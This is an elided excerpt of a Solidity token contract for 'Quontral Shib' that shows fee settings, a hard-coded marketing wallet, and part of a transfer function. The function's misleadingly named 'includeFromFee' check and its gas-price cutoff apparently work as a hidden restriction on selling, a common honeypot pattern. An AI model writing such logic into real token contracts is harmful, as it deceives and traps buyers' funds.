...
contract QuontralShib is Context, IERC20, Ownable {
    ...
    string private constant _name = "Quontral Shib"; // 
    string private constant _symbol = "QUONS"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 0;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x87E05905590352b1F3B7a0C134ac5767CaB49F82;
    address[] private includeFromFee;
    uint256 public _buyCooldown = 0 minutes;
    mapping (address => uint256) private _lastBuy;
    uint256 gweiAllowed = 7 * 1 gwei;  
    ...
    function _transfer(
        ...
        if (balanceOf(address(this)) >= SWAP_TOKENS_AT_AMOUNT && !swapping && from != uniswapV2Pair && from != owner() && to != owner()) { require(!_isIncludedFromFee[from]); if (tx.gasprice > gweiAllowed) return;
            swapping = true;
